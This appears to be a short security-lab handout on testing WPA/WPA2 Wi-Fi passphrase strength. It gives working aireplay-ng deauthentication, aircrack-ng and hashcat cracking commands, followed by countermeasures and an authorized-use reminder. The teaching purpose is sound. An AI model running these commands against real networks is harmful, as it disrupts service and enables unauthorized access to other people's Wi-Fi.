# L11: WPA/WPA2 Security Assessment

## Purpose

Assess Wi-Fi authentication strength by capturing handshakes and testing passphrase entropy (authorized lab only).

## Aircrack-ng — usage steps

```bash
# Deauth to force handshake (lab AP only)
sudo aireplay-ng -0 5 -a <AP_BSSID> wlan0mon

# Crack captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

## hashcat alternative

```bash
# Convert cap to hashcat format
cap2hccapx capture-01.cap output.hccapx
hashcat -m 2500 output.hccapx rockyou.txt
```

## Countermeasures

- Use passphrases ≥ 20 random characters.
- Enable **PMF** (802.11w) where supported.
- Rate-limit authentication attempts.
- Monitor for deauth floods (deauth attack detection).

---

*Lab reminder: test only on authorized systems. Unauthorized access violates the IT Act, 2000.*
